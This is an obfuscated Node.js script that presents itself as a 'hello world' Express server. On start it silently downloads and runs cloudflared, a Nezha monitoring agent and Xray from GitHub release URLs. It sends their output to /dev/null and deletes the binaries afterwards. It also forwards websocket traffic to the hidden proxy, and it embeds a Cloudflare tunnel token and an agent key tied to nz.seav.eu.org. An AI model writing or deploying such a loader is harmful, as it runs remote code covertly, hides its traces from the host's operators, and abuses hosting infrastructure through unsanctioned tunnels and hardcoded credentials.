const _0x1459b8=_0x3303;function _0x189b(){const _0x1b24f5=['child_process','nohup\x20./nz\x20-s\x20','244CGOBKc','nz.seav.eu.org','nohup\x20./xr\x20>/dev/null\x202>&1\x20&','finish','stream','https://github.com/seav1/dl/releases/download/files/cf','112XnlBFw','length','env','createWriteStream','7721250wZFhKu','10bHqeGO','silent','mTP8qwlGOuWO8c3TsV','forEach','7532kBjZhg','1166842oCWioo','27174fQMJna','GET','createServer','upgrade','1715KOeHWz','https://github.com/seav1/dl/releases/download/files/nz-arm','https://github.com/seav1/dl/releases/download/files/nz','https://github.com/seav1/xr/releases/download/latest/xray-linux-arm64','send','\x20--url\x20http://localhost:8002\x20>/dev/null\x202>&1\x20&','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYzYyMTE0ZGYtYWYwZC00YTU2LWE1NjctMjM3NDdjMmI0M2ExIiwicyI6Ik5XWXlZakkxWVRndE5UUXpaQzAwTjJGa0xUaGxabVV0WVRReU1HWmlOMkl3T0dVeSJ9','7172363FwLgxh',':443\x20-p\x20','196483cPaiVi','listening\x20on\x20port\x20','nohup\x20./cf\x20tunnel\x20--edge-ip-version\x20auto\x20run\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20','x64','unlink','get','\x20--tls\x20--disable-auto-update\x20--skip-procs\x20--skip-conn\x20>/dev/null\x202>&1\x20&','status','12815073KZJjKm','ws://localhost:8002','PORT','N_K','N_S','chmod\x20+x\x20./'];_0x189b=function(){return _0x1b24f5;};return _0x189b();}function _0x3303(_0x264ac1,_0x4ff5e7){const _0x189ba4=_0x189b();return _0x3303=function(_0x3303ae,_0x25fedc){_0x3303ae=_0x3303ae-0x1d5;let _0x1dff14=_0x189ba4[_0x3303ae];return _0x1dff14;},_0x3303(_0x264ac1,_0x4ff5e7);}(function(_0x17dfa7,_0x1a65e3){const _0x3b0c4a=_0x3303,_0x597721=_0x17dfa7();while(!![]){try{const _0x25367d=parseInt(_0x3b0c4a(0x1de))/0x1+-parseInt(_0x3b0c4a(0x1fc))/0x2*(parseInt(_0x3b0c4a(0x1df))/0x3)+-parseInt(_0x3b0c4a(0x1dd))/0x4*(-parseInt(_0x3b0c4a(0x1e3))/0x5)+parseInt(_0x3b0c4a(0x1d8))/0x6+-parseInt(_0x3b0c4a(0x1ec))/0x7*(parseInt(_0x3b0c4a(0x202))/0x8)+parseInt(_0x3b0c4a(0x1f4))/0x9*(-parseInt(_0x3b0c4a(0x1d9))/0xa)+parseInt(_0x3b0c4a(0x1ea))/0xb;if(_0x25367d===_0x1a65e3)break;else _0x597721['push'](_0x597721['shift']());}catch(_0x1ea610){_0x597721['push'](_0x597721['shift']());}}}(_0x189b,0xca8f0));const C_T=process[_0x1459b8(0x1d6)]['C_T']||_0x1459b8(0x1e9),N_S=process[_0x1459b8(0x1d6)][_0x1459b8(0x1f8)]||_0x1459b8(0x1fd),N_K=process[_0x1459b8(0x1d6)][_0x1459b8(0x1f7)]||_0x1459b8(0x1db),port=process[_0x1459b8(0x1d6)]['SERVER_PORT']||process[_0x1459b8(0x1d6)][_0x1459b8(0x1f6)]||0xbb8,axios=require('axios'),fs=require('fs'),{exec}=require(_0x1459b8(0x1fa)),express=require('express'),{createProxyMiddleware}=require('http-proxy-middleware'),http=require('http'),app=express(),URLS_x86_64=[_0x1459b8(0x201),_0x1459b8(0x1e5),'https://github.com/seav1/xr/releases/download/latest/xray-linux-amd64'],URLS_arm=['https://github.com/seav1/dl/releases/download/files/cf-arm',_0x1459b8(0x1e4),_0x1459b8(0x1e6)],FILES=['cf','nz','xr'],downloadFile=async(_0x111f65,_0x164156)=>{const _0x7ed169=_0x1459b8,_0x2eee6f=fs[_0x7ed169(0x1d7)]('./'+_0x164156),_0x59a735=await axios({'url':_0x111f65,'method':_0x7ed169(0x1e0),'responseType':_0x7ed169(0x200)});return _0x59a735['data']['pipe'](_0x2eee6f),new Promise(_0x1ed4eb=>{const _0x1aca28=_0x7ed169;_0x2eee6f['on'](_0x1aca28(0x1ff),_0x1ed4eb);});},executeCommand=_0x68eb2e=>{return new Promise(_0x2f06e6=>{exec(_0x68eb2e,()=>{_0x2f06e6();});});},deleteFiles=()=>{const _0x599152=_0x1459b8;FILES[_0x599152(0x1dc)](_0x3c1f63=>{const _0x34ec13=_0x599152;fs[_0x34ec13(0x1f0)]('./'+_0x3c1f63,()=>{});});},main=async()=>{const _0x345a6a=_0x1459b8,_0x274e00=process['arch']===_0x345a6a(0x1ef)?URLS_x86_64:URLS_arm;for(let _0x376fa4=0x0;_0x376fa4<_0x274e00[_0x345a6a(0x1d5)];_0x376fa4++){await downloadFile(_0x274e00[_0x376fa4],FILES[_0x376fa4]),await executeCommand(_0x345a6a(0x1f9)+FILES[_0x376fa4]);}await executeCommand(_0x345a6a(0x1ee)+C_T+_0x345a6a(0x1e8)),await executeCommand(_0x345a6a(0x1fb)+N_S+_0x345a6a(0x1eb)+N_K+_0x345a6a(0x1f2)),await executeCommand(_0x345a6a(0x1fe)),deleteFiles();};main(),app[_0x1459b8(0x1f1)]('/',(_0xb55f1e,_0x5b88e1)=>{const _0x4b7579=_0x1459b8;_0x5b88e1[_0x4b7579(0x1f3)](0xc8)[_0x4b7579(0x1e7)]('hello\x20world');});const server=http[_0x1459b8(0x1e1)](app);server['on'](_0x1459b8(0x1e2),createProxyMiddleware({'target':_0x1459b8(0x1f5),'changeOrigin':!![],'ws':!![],'logLevel':_0x1459b8(0x1da)})),server['listen'](port,()=>{const _0x387163=_0x1459b8;console['log'](_0x387163(0x1ed)+port);});
